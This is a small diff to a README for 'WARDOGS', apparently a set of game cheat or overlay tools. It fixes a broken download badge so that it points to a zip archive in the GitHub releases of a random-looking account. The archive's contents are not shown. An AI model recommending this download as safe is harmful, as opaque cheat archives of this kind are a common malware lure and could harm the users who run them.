@@ -25,7 +25,7 @@ The project provides a collection of gameplay tools, including visual informatio
 
 ### ⬇️ Download
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=githubhttps://github.com/rad5-Raven595880/WARDOGS/releases/download/Wardogs/Archive_1.zip)]().
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/rad5-Raven595880/WARDOGS/releases/download/Wardogs/Archive_1.zip).
 
 **Latest Version:** `v1.0.0` • 
 
